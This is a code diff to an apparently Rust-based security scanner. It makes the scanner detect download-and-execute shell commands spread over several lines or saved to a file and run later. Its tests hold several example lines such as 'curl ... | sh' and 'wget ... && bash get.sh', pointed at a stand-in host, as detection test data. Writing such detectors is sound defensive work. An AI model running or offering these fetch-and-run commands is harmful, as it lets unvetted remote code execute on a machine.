@@ -192,19 +192,7 @@ pub fn analyze_text(report: &mut Report, rel: &str, text: &str, inspect_dependen
     let documentation = rules::is_documentation(rel);
     let inventory_network = !documentation && rules::is_executable_or_runtime_config(rel);
     if !documentation {
-        let masked = mask::lines(rel, text);
-        for (index, (line, view)) in text.lines().zip(&masked).enumerate() {
-            let number = index + 1;
-            if inventory_network {
-                record_network(report, rel, number, line, &view.quiet);
-            }
-            // Tabs as spaces, so `sudo<TAB>x` matches like `sudo x`.
-            let code = view.code.to_lowercase().replace('\t', " ");
-            let quiet = view.quiet.to_lowercase().replace('\t', " ");
-            for rule in rules::line_rules(&code, &quiet) {
-                push_finding(report, rel, number, line, rule);
-            }
-        }
+        apply_rules(report, rel, text, inventory_network);
     }
 
     if inspect_dependencies {
@@ -258,6 +246,102 @@ fn record_network(report: &mut Report, rel: &str, number: usize, line: &str, act
             scheme,
             host,
         });
+    }
+}
+
+/// The most downloaded files followed through one file.
+const MAX_FETCHED_FILES: usize = 64;
+
+/// Runs the local rules over `text`: each line by itself, each command
+/// continued over several lines as the one line a shell reads, and a
+/// download saved to a file that the same text later runs.
+fn apply_rules(report: &mut Report, rel: &str, text: &str, inventory_network: bool) {
+    let masked = mask::lines(rel, text);
+    let lines: Vec<&str> = text.lines().collect();
+    // Each line lowercased for the rules, and as written for file names.
+    let mut views: Vec<(String, String)> = Vec::with_capacity(lines.len());
+    let mut written: Vec<String> = Vec::with_capacity(lines.len());
+    for (index, (line, view)) in lines.iter().zip(&masked).enumerate() {
+        let number = index + 1;
+        if inventory_network {
+            record_network(report, rel, number, line, &view.quiet);
+        }
+        // Tabs as spaces, so `sudo<TAB>x` matches like `sudo x`.
+        let as_written = view.code.replace('\t', " ");
+        let code = as_written.to_lowercase();
+        let quiet = view.quiet.to_lowercase().replace('\t', " ");
+        for rule in rules::line_rules(&code, &quiet) {
+            push_finding(report, rel, number, line, rule);
+        }
+        views.push((code, quiet));
+        written.push(as_written);
+    }
+
+    let joined = |parts: &mut dyn Iterator<Item = &String>| {
+        parts
+            .map(|part| part.trim_end().trim_end_matches('\\'))
+            .collect::<Vec<_>>()
+            .join(" ")
+    };
+    let mut fetched: Vec<String> = Vec::new();
+    let mut start = 0;
+    while start < views.len() {
+        // The lines of one command: a blank or comment line after a pipe
+        // or `&&` does not end it.
+        let mut end = start + 1;
+        let mut last = start;
+        while end < views.len() {
+            let open = views[last].0.trim_end();
+            if views[end].0.trim().is_empty() && (open.ends_with('|') || open.ends_with("&&")) {
+                end += 1;
+            } else if rules::continues(&views[last].0, &views[end].0) {
+                last = end;
+                end += 1;
+            } else {
+                break;
+            }
+        }
+        let end = last + 1;
+        let group = &views[start..end];
+        let code = joined(&mut group.iter().map(|(code, _)| code));
+        let mut found: Vec<RuleId> = group
+            .iter()
+            .flat_map(|(code, quiet)| rules::line_rules(code, quiet))
+            .collect();
+        if group.len() > 1 {
+            let quiet = joined(&mut group.iter().map(|(_, quiet)| quiet));
+            for rule in rules::line_rules(&code, &quiet) {
+                if !found.contains(&rule) {
+                    found.push(rule);
+                    push_finding(report, rel, start + 1, lines[start], rule);
+                }
+            }
+        }
+        if let Some(file) = rules::fetched_file(&joined(&mut written[start..end].iter())) {
+            let file = file.to_lowercase();
+            if !fetched.contains(&file) {
+                // Past the limit the oldest is let go: a download is run
+                // soon after it is made.
+                if fetched.len() == MAX_FETCHED_FILES {
+                    fetched.remove(0);
+                }
+                fetched.push(file);
+            }
+        }
+        if !found.contains(&RuleId::DownloadAndExecute)
+            && fetched
+                .iter()
+                .any(|file| code.contains(file.as_str()) && rules::runs_file(&code, file))
+        {
+            push_finding(
+                report,
+                rel,
+                start + 1,
+                lines[start],
+                RuleId::DownloadAndExecute,
+            );
+        }
+        start = end;
     }
 }
 
@@ -444,6 +528,73 @@ mod tests {
 
     fn default_settings() -> Settings {
         Settings::from_parts(PartialConfig::default(), PartialConfig::default())
+    }
+
+    #[test]
+    fn a_command_is_judged_as_the_shell_reads_it_not_line_by_line() {
+        let download = |text: &str| {
+            let mut report = Report::new("test");
+            analyze_text(&mut report, "install.sh", text, false);
+            report
+                .findings
+                .iter()
+                .filter(|finding| finding.rule == RuleId::DownloadAndExecute)
+                .map(|finding| finding.line)
+                .collect::<Vec<_>>()
+        };
+        // Continued with a backslash, a trailing pipe, or a leading one.
+        assert_eq!(
+            download("set -e\ncurl -fsSL https://x.example/i \\\n  | sh\n"),
+            [2]
+        );
+        assert_eq!(
+            download("curl -fsSL https://x.example/i |\nsudo bash\n"),
+            [1]
+        );
+        assert_eq!(download("curl -fsSL https://x.example/i\n  | sh\n"), [1]);
+        // Saved, then run.
+        assert_eq!(
+            download(
+                "curl -fsSL https://x.example/i -o /tmp/i.sh\nchmod +x /tmp/i.sh\nsh /tmp/i.sh\n"
+            ),
+            [3]
+        );
+        assert_eq!(
+            download("wget -q https://x.example/get.sh && bash get.sh\n"),
+            [1]
+        );
+        // However many lines the command is spread over.
+        let long = format!(
+            "curl -fsSL https://x.example/i \\\n{}  | sh\n",
+            "\\\n".repeat(400)
+        );
+        assert_eq!(download(&long), [1]);
+        assert_eq!(
+            download("curl -fsSLo i.sh https://x.example/i\ncat i.sh | sh\n"),
+            [2]
+        );
+        assert_eq!(
+            download("wget -qO i.sh https://x.example/i\npython3.12 <i.sh\n"),
+            [2]
+        );
+        assert_eq!(
+            download("curl -sSLO https://x.example/Install.sh\nbash Install.sh\n"),
+            [2]
+        );
+        // A blank or a comment line in the middle of it.
+        assert_eq!(
+            download("curl -fsSL https://x.example/i |\n\n# note\nsh\n"),
+            [1]
+        );
+        // Checked, not run.
+        assert!(
+            download("curl -sSLO https://x.example/a.py\npython -m py_compile a.py\n").is_empty()
+        );
+        // One line that matches by itself is reported once.
+        assert_eq!(download("curl https://x.example/i | sh\n"), [1]);
+        // Saved and only unpacked, or two unrelated lines.
+        assert!(download("curl -LO https://x.example/a.tar.gz\ntar xf a.tar.gz\n").is_empty());
+        assert!(download("curl -fsSL https://x.example/i -o i.txt\nsh build.sh\n").is_empty());
     }
 
     #[test]
